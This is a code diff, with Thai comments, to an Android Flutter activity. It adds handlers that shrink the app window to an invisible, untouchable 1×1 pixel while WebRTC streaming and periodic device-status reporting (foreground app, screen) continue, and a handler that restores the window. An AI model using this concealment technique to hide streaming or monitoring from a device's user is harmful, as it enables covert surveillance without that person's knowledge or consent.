@@ -109,6 +109,51 @@ class MainActivity : FlutterActivity() {
                     moveTaskToBack(true)
                     result.success(true)
                 }
+                "makeWindowInvisible" -> {
+                    // ลดขนาด window เหลือ 1×1 px + alpha 0 → user มองไม่เห็น
+                    // FlutterEngine ยังรันต่อใน background, WebRTC ยังส่งสตรีม
+                    // ป้องกัน UI flash ระหว่าง launch → minimize
+                    runOnUiThread {
+                        try {
+                            val lp = window.attributes
+                            lp.width = 1
+                            lp.height = 1
+                            lp.gravity = android.view.Gravity.TOP or android.view.Gravity.START
+                            lp.x = 0
+                            lp.y = 0
+                            lp.alpha = 0f
+                            // ไม่รับ touch + ไม่ focus → user แตะอะไรไม่ได้แม้บังเอิญ
+                            lp.flags = lp.flags or
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                            window.attributes = lp
+                        } catch (e: Exception) {
+                            Log.w(TAG, "makeWindowInvisible failed: ${e.message}")
+                        }
+                    }
+                    result.success(true)
+                }
+                "restoreWindow" -> {
+                    // คืน window ขนาดปกติ (สำหรับ factory-reset / user เปิด UI ใหม่)
+                    runOnUiThread {
+                        try {
+                            val lp = window.attributes
+                            lp.width = WindowManager.LayoutParams.MATCH_PARENT
+                            lp.height = WindowManager.LayoutParams.MATCH_PARENT
+                            lp.gravity = android.view.Gravity.NO_GRAVITY
+                            lp.x = 0
+                            lp.y = 0
+                            lp.alpha = 1f
+                            lp.flags = lp.flags and
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv() and
+                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
+                            window.attributes = lp
+                        } catch (e: Exception) {
+                            Log.w(TAG, "restoreWindow failed: ${e.message}")
+                        }
+                    }
+                    result.success(true)
+                }
                 "readDeviceStatus" -> {
                     // อ่าน battery/network/foreground app/screen — ใช้ใน periodic reporter
                     result.success(DeviceStatusReader.read(this))
